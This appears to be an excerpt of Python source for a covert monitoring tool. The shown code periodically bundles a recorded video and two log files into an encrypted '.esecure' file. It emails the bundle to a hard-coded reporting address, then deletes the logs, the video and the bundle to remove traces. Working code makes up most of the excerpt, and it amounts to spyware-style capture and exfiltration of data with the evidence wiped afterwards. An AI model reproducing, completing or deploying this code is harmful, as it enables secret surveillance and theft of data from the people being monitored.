...
EMAIL_ADDRESS = 'emailToRecieveReports@(hotmail)or(outlook).com'   
...
def encrypt_content(content):
    """Encrypt content using the SECRET_KEY."""
    encrypted_data = fernet.encrypt(content)
    return encrypted_data.decode('utf-8')


def encrypt_binary_content(content):
    """Encrypt binary content using the SECRET_KEY."""
    encrypted_data = fernet.encrypt(content)
    return encrypted_data.decode('utf-8')
...
def create_esecure_file(file_list, escure_file):
    """Create a custom .esecure file that contains encrypted data of multiple files."""
    esecure_data = []
    ...
    for file_path in file_list:
        ...
        if file_path.endswith('.txt'):
            ...
            with open(file_path, 'rb') as file:
                content = file.read()
            encrypted_content = encrypt_binary_content(content)

        
        file_entry = {"name": os.path.basename(file_path), "content": encrypted_content}
        esecure_data.append(file_entry)

    
    with open(escure_file, 'w') as file:
        json.dump(esecure_data, file)
    
    print(f".esecure file {escure_file} created successfully.")
...
def periodic_tasks(folder_name, interval, log_file, total_log_file):
    while True:
        ...
        if output_video:
            ...
            create_esecure_file([output_video, log_file, total_log_file], ESCURE_FILE)

            
            send_email_with_attachments(
                subject=EMAIL_SUBJECT,
                body=email_body,
                attachments=[ESCURE_FILE]  
            )
            
            
            delete_files([log_file, total_log_file, output_video, ESCURE_FILE])
            cleanup(folder_name)
